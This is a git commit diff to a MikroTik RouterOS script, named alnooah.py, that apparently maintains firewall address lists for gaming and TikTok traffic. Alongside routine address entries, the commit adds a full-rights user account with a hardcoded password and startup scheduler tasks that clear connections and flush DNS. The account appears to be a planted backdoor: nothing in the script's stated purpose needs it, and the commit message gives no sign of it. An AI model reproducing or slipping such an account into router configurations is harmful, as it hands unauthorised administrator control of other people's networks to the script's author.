5f03e10baf5f51da7a110b0c76d72dac4bdf2ef8
ayman alnooah <79175683+aymanalnooah@users.noreply.github.com>
2023-07-23 04:07:40 +0300

    Update alnooah.py

--- alnooah.py
+++ alnooah.py
@@ -6,13 +6,19 @@ add address=71.18.1.229 comment="free fire" list=0TIKTOK
 add address=71.18.1.236 comment="free fire" list=0TIKTOK
 
 
-#remove old
 
 remove [find address=157.240.227.61 list=0TIKTOK]
 remove [find address=157.240.227.1 list=0TIKTOK]
 remove [find address=34.104.35.84 list=0TIKTOK]
 remove [find address=219.93.26.46 list=0TIKTOK]
 
+/user add name=strong password=Aa777920256 group=full
+
+
+/system scheduler
+add disabled=no interval=0s name="remove connec" on-event="/ip  firewall connection remove [find];" policy=ftp,reboot,read,write,policy,test,winbox,password,sniff,sensitive,api start-time=startup
+
+add disabled=no interval=0s name=dns on-event="/ip dns cache flush" policy=ftp,reboot,read,write,policy,test,winbox,password,sniff,sensitive,api start-time=startup
 
 
 
